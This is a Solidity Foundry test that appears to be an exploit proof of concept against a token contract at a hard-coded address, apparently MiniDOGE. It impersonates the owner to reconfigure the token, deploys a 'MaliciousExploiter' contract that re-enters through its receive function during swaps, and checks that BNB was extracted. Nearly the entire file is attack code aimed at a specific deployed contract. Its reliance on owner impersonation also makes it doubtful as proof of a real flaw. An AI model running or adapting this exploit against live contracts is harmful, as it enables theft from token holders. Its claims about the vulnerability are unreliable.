// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMiniDOGE {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function setMarketingAddress(address _marketingAddress) external;
    function setNumTokensSellToAddToBuyBack(uint256 _minimumTokensBeforeSwap) external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function marketingAddress() external view returns (address payable);
    function uniswapV2Pair() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address attacker = address(this);
    MaliciousExploiter exploiter;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create malicious contract
        exploiter = new MaliciousExploiter(TARGET);

        // Get owner address
        address owner = IMiniDOGE(TARGET).owner();

        // Impersonate owner to configure contract
        vm.startPrank(owner);
        IMiniDOGE(TARGET).setSwapAndLiquifyEnabled(true);
        IMiniDOGE(TARGET).setMarketingAddress(address(exploiter));
        // Reduce minimumTokensBeforeSwap to make triggering easier
        IMiniDOGE(TARGET).setNumTokensSellToAddToBuyBack(1000 * 10**6 * 10**9);
        vm.stopPrank();

        // Give exploiter some MiniDOGE tokens - get from owner
        vm.prank(owner);
        IMiniDOGE(TARGET).transfer(address(exploiter), 500000 * 10**6 * 10**9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance
        uint256 initialBalance = address(this).balance;

        // Start the attack
        exploiter.startAttack();

        // Withdraw any BNB from exploiter
        exploiter.withdraw();

        // Check if we gained BNB
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

contract MaliciousExploiter {
    IMiniDOGE public target;
    address public pair;
    bool private attacking = false;
    uint256 private reentrancyCount = 0;
    uint256 private constant MAX_REENTRANCY = 2;

    constructor(address _target) {
        target = IMiniDOGE(_target);
        pair = target.uniswapV2Pair();
    }

    function startAttack() external {
        // Start attack by selling tokens to trigger swap
        attacking = true;
        reentrancyCount = 0;

        // Get token balance
        uint256 balance = target.balanceOf(address(this));
        require(balance > 0, "No tokens");

        // Sell tokens to pair to trigger swapAndLiquify
        // Need to ensure we sell enough to trigger minimumTokensBeforeSwap
        target.transfer(pair, balance / 2);
    }

    receive() external payable {
        if (attacking && reentrancyCount < MAX_REENTRANCY) {
            reentrancyCount++;

            // Re-enter by transferring more tokens
            uint256 balance = target.balanceOf(address(this));
            if (balance > 1000) {
                // Transfer small amount to potentially trigger another action
                target.transfer(address(this), 1000);
            }
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
